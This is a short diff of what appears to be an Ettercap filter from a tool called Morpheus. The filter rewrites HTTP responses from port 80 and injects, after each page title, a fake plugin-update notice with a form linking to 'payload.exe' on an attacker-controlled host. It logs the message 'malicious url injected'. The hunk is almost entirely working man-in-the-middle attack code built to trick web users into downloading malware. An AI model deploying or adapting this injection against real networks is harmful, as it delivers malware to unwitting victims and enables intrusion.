@@ -35,7 +35,6 @@ if (ip.proto == TCP && tcp.dst == 80) {
 if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<title>")) {
     replace("</title>", "</title><form action='http://192.168.1.67/payload.exe' method='link'><INPUT TYPE='submit' value='DOWNLOAD_PLUGIN'></form><html><body><h10>You are unable to view some of the web page’s contents. You need to download the latest plugins to fix this issue.</h10></body></html>");
-
     msg("[Morpheus] malicious url injected...\n");
   }
 }
